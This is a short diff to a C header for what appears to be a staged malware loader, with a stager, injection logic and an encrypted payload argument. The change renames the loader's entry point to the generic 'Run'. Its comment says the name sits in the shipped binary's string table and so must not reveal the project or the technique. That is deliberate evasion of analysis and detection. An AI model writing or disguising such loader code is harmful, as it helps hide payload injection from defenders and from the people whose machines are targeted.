@@ -8,7 +8,9 @@
  * dispatcher and the injection logic; the stager only bootstraps.
  *
  * Keep the entry name and the function signature here so the two sides
- * cannot drift apart unnoticed.
+ * cannot drift apart unnoticed. The name is deliberately generic: it lands in
+ * the shipped host's string table as the lookup key, so it must not describe
+ * the project or the technique.
  */
 #ifndef STAGED_LOADER_STAGE_ABI_H
 #define STAGED_LOADER_STAGE_ABI_H
@@ -16,7 +18,7 @@
 #include <stddef.h>
 #include <wchar.h>
 
-#define STAGED_LOADER_ENTRY "StageMain"
+#define STAGED_LOADER_ENTRY "Run"
 
 typedef int(__cdecl *staged_loader_main_fn)(int argc, wchar_t **argv,
                                         const unsigned char *enc_payload,
